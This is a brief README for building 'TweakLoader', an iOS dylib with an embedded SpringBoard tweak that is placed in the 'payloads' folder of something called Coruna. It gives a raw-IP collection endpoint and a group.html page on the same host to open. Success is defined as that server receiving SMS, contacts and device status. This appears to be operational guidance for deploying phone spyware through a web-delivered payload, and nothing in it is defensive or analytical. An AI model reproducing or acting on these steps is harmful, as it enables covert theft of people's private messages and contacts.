# TweakLoader (Route A build)

GitHub Actions builds `TweakLoader.dylib` + embedded `SpringBoardTweak` for Coruna Route A data collection.

## Collect endpoint
Primary: `http://143.92.36.95:8080/api/collect`

## After Actions succeeds
1. Download artifact `TweakLoader-dylibs`
2. Copy `TweakLoader_arm64.dylib` to Coruna:
   - `payloads/TweakLoader.dylib`
3. Open:
   - `http://143.92.36.95:8080/group.html?v=routeA-built`
4. Success if server gets `type=native_status` / `sms` / `contacts`
